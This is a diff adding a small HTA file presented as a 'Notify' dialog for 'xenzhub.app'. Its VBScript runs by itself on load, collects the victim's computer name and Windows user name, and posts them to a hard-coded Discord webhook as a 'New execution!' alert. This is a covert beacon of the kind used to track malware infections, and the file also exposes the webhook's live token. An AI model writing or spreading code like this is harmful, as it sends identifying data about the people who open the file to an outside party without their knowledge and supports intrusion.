@@ -1,0 +1,40 @@
+<html>
+<head>
+  <title>Notify</title>
+  <HTA:APPLICATION
+    ID="notify"
+    APPLICATIONNAME="Notify"
+    BORDER="dialog"
+    BORDERSTYLE="normal"
+    INNERBORDER="no"
+    MAXIMIZEBUTTON="no"
+    MINIMIZEBUTTON="no"
+    SYSMENU="yes"
+    SINGLEINSTANCE="yes"
+  />
+</head>
+<script language="VBScript">
+  Sub Window_OnLoad
+    window.resizeTo 300, 150
+    window.moveTo (screen.availWidth - 300) / 2, (screen.availHeight - 150) / 2
+    
+    Dim http, pc, user, payload
+    
+    pc = CreateObject("WScript.Network").ComputerName
+    user = CreateObject("WScript.Network").UserName
+    
+    payload = "{""content"": ""**New execution!**\nComputer: " & pc & "\nUser: " & user & """}"
+    
+    Set http = CreateObject("MSXML2.ServerXMLHTTP")
+    http.Open "POST", "https://discord.com/api/webhooks/1562944722320752655/ibW4rs9GgxJr6ozQsj0BGufEGR-BaoKTkMMRkwQjsuhwIMYU7JQxDKTkoHn81AYU_aQ1", False
+    http.setRequestHeader "Content-Type", "application/json"
+    http.Send payload
+    
+    document.getElementById("status").innerHTML = "Sent! PC: " & pc & " | User: " & user
+  End Sub
+</script>
+<body style="font-family:system-ui;background:#0d1117;color:#c9d1d9;text-align:center;padding:20px">
+  <h2 style="color:#58a6ff">xenzhub.app</h2>
+  <p id="status">Sending...</p>
+</body>
+</html>
